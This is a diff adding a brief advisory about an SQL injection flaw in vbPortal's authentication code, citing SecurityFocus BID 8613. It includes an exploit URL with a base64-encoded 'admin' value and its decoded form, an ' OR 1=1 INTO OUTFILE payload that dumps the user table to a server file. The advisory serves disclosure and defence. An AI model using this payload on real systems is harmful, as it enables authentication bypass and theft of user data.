@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/8613/info
+
+It has been reported that vbPortal is prone to SQL injection attacks when authentication users. The problem occurs due to insufficient sanitization of the $aid variable, used to store the name of the authenticating user. As a result, an attacker may supply data within the username designed to prematurely terminate the string, and influence the logic of the current SQL query. This may be exploited to expose sensitive information, or potentially to launch attacks against the underlying database. 
+
+http://www.example.org/auth.inc.php?admin=JyBPUiAxPTEgSU5UTyBPVVRGSUxFICcvY29tcGxldGUvcGF0aC9Vc2VyVGFibGUudHh0OjE=
+
+It should be noted that the above base64 encoded string contains the following data:
+
+' OR 1=1 INTO OUTFILE '/complete/path/UserTable.txt:1 
